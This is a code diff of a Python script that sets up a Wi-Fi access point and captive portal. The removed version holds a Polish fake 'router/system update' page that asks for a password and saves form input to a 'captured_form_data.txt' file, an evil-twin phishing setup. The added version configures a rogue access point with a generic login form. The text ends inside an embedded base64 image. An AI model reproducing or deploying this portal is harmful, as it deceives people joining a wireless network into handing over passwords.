@@ -1,588 +1,207 @@
 #!/usr/bin/env python3
-# -*- coding: utf-8 -*-
 
 import os
 import sys
-import netifaces
-import subprocess
-from http.server import HTTPServer, BaseHTTPRequestHandler
-import threading
 import time
-import socket
-from datetime import datetime
-from urllib.parse import parse_qs
+import subprocess
+import threading
+from http.server import HTTPServer, BaseHTTPRequestHandler
+import logging
 
-# ==================== CONFIGURATION ====================
-HTML_FILE = "Router_update_v2.html"
-PORT = 80
-CAPTIVE_PORTAL_SSID = ""
-AP_STATIC_IP = "192.168.1.1/24"
-FORM_OUTPUT_FILE = "captured_form_data.txt"
-PORTAL_HTML = ""
-EMBEDDED_PORTAL_HTML = """<!DOCTYPE html>
-<html lang="pl">
+# Konfiguracja logowania
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+
+# Konfiguracja
+AP_INTERFACE = "wlan0"
+INTERNET_INTERFACE = "eth0"
+AP_SSID = "CaptivePortal"
+AP_PASSWORD = "password123"
+AP_CHANNEL = "6"
+AP_IP = "192.168.100.1"
+SUBNET = "192.168.100.0"
+NETMASK = "255.255.255.0"
+DHCP_RANGE_START = "192.168.100.100"
+DHCP_RANGE_END = "192.168.100.200"
+LEASE_TIME = "12h"
+
+# HTML dla captive portal - miejsce na base64
+HTML_PAGE = """<!DOCTYPE html>
+<html>
 <head>
-<meta charset="utf-8" />
-<meta name="viewport" content="width=device-width,initial-scale=1" />
-<title>Aktualizacja sieci – System Update</title>
-<style>
-  /* reset */
-  *{box-sizing:border-box;margin:0;padding:0}
-  html,body{height:100%}
-
-  /* layout */
-  body{
-    font-family: "Segoe UI", Roboto, Arial, sans-serif;
-    background: #0b0c10;
-    color:#fff;
-    display:flex;
-    align-items:center;
-    justify-content:center;
-    min-height:100vh;
-    overflow:hidden;
-  }
-
-  /* --- Faliste tło inspirowane macOS (skalowalne) --- */
-  /* 3 warstwy dużych, miękkich fal plus delikatna siatka */
-  .bg {
-    position:fixed;
-    inset:0;
-    z-index:0;
-    pointer-events:none;
-    background-color:#0b0c10;
-  }
-
-  /* duże miękkie kształty z rozmyciem - skalują się z viewportem */
-  .wave {
-    position:absolute;
-    left:50%;
-    transform:translateX(-50%);
-    filter:blur(32px) saturate(120%);
-    opacity:0.98;
-    border-radius: 50%;
-    mix-blend-mode: screen;
-  }
-
-  /* dolna turkusowo-fioletowa fala */
-  .wave.w1{
-    width:180vw;
-    height:90vh;
-    bottom:-20vh;
-    background: radial-gradient(60% 60% at 30% 40%, rgba(22,210,220,0.95), rgba(90,60,200,0.9) 40%, rgba(70,40,160,0.75) 65%, transparent 75%);
-    transform: translateX(-52%) rotate(-6deg) scale(1.05);
-  }
-
-  /* środkowa fioletowo-różowa fala */
-  .wave.w2{
-    width:200vw;
-    height:72vh;
-    bottom:10vh;
-    background: radial-gradient(60% 60% at 60% 30%, rgba(200,50,120,0.95), rgba(150,60,220,0.9) 35%, rgba(100,40,200,0.6) 60%, transparent 72%);
-    transform: translateX(-50%) rotate(-4deg);
-    opacity:0.95;
-  }
-
-  /* górna czerwona ciemna fala */
-  .wave.w3{
-    width:220vw;
-    height:55vh;
-    top:-12vh;
-    background: radial-gradient(60% 60% at 20% 60%, rgba(220,40,60,0.95), rgba(160,30,100,0.75) 40%, rgba(20,20,80,0.5) 75%, transparent 82%);
-    transform: translateX(-48%) rotate(2deg) scale(1.02);
-    opacity:0.92;
-  }
-
-  /* delikatna siateczka / tekstura (subtelnie) */
-  .grid {
-    position:absolute;
-    inset:0;
-    background-image:
-      linear-gradient(90deg, rgba(255,255,255,0.015) 1px, transparent 1px),
-      linear-gradient(0deg, rgba(255,255,255,0.015) 1px, transparent 1px);
-    background-size: 120px 120px;
-    mix-blend-mode: overlay;
-    pointer-events:none;
-    opacity:0.35;
-  }
-
-  /* container z treścią (zachowuje mechanizm oryginału) */
-  .container{
-    position:relative;
-    z-index:2;
-    width:92%;
-    max-width:380px;
-    background: rgba(10,12,15,0.72);
-    border-radius:12px;
-    padding:30px 22px;
-    box-shadow: 0 10px 30px rgba(0,0,0,0.6), 0 0 40px rgba(0,150,255,0.06);
-    text-align:center;
-    backdrop-filter: blur(8px) saturate(120%);
-  }
-
-  .logo { margin-bottom:18px }
-  .logo img {
-    max-width:110px;
-    height:auto;
-    filter: drop-shadow(0 6px 18px rgba(0,150,255,0.18));
-    transition: transform .35s ease;
-  }
-  .logo img:hover{ transform: scale(1.03) }
-
-  .header{
-    font-size:1.4rem;
-    font-weight:700;
-    color:#9ee6ff;
-    margin-bottom:12px;
-    text-shadow: 0 0 10px rgba(0,150,255,0.12);
-  }
-
-  .message{
-    color:#dbeeff;
-    opacity:0.92;
-    font-size:0.95rem;
-    margin-bottom:20px;
-    line-height:1.45;
-  }
-
-  form{ margin-bottom:22px }
-  input[type="password"]{
-    width:100%;
-    padding:12px 14px;
-    border-radius:8px;
-    border:1px solid rgba(255,255,255,0.06);
-    background: rgba(255,255,255,0.06);
-    color:#fff;
-    font-size:1rem;
-    outline:none;
-    transition: box-shadow .18s, border-color .18s, background .18s;
-    margin-bottom:14px;
-  }
-  input[type="password"]::placeholder{ color:rgba(255,255,255,0.6) }
-
-  input[type="password"]:focus{
-    background: rgba(255,255,255,0.09);
-    border-color: rgba(0,170,255,0.6);
-    box-shadow: 0 6px 20px rgba(0,150,255,0.14);
-  }
-
-  button{
-    width:100%;
-    padding:12px;
-    border-radius:8px;
-    border:none;
-    background: linear-gradient(90deg,#0aa7ff,#0047ff);
-    color:#fff;
-    font-weight:700;
-    font-size:1rem;
-    cursor:pointer;
-    box-shadow: 0 6px 18px rgba(0,0,0,0.45);
-    transition: transform .14s ease, box-shadow .14s ease;
-  }
-  button:hover{ transform: translateY(-3px); box-shadow:0 12px 26px rgba(0,70,255,0.24) }
-
-  .footer{ margin-top:18px; font-size:0.8rem; color:#bfcbe0; border-top:1px solid rgba(255,255,255,0.03); padding-top:12px }
-  .footer .footer-logo img{ max-width:200px; filter:drop-shadow(0 6px 14px rgba(0,150,255,0.12)) }
-
-  /* responsywność małych ekranów */
-  @media (max-width:360px){
-    .container{ padding:22px 14px }
-    .header{ font-size:1.15rem }
-  }
-
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Captive Portal</title>
+    <style>
+        body {{
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 50px;
+            background-color: #f0f0f0;
+        }}
+        .container {{
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            display: inline-block;
+        }}
+        h1 {{
+            color: #333;
+        }}
+        .logo {{
+            max-width: 200px;
+            margin: 20px 0;
+        }}
+        .login-form {{
+            margin: 20px 0;
+        }}
+        input[type="text"], input[type="password"] {{
+            padding: 10px;
+            margin: 10px;
+            width: 200px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+        }}
+        button {{
+            padding: 10px 20px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }}
+        button:hover {{
+            background-color: #45a049;
+        }}
+    </style>
 </head>
 <body>
-  <!-- Tło (fale) -->
-  <div class="bg" aria-hidden="true">
-    <div class="wave w1"></div>
-    <div class="wave w2"></div>
-    <div class="wave w3"></div>
-    <div class="grid"></div>
-  </div>
+    <div class="container">
+        <h1>Welcome to Captive Portal</h1>
+        <div class="logo">
+            <!-- Tutaj będzie obraz base64 -->
+                <img alt="Logo" src="data:image/png;base64,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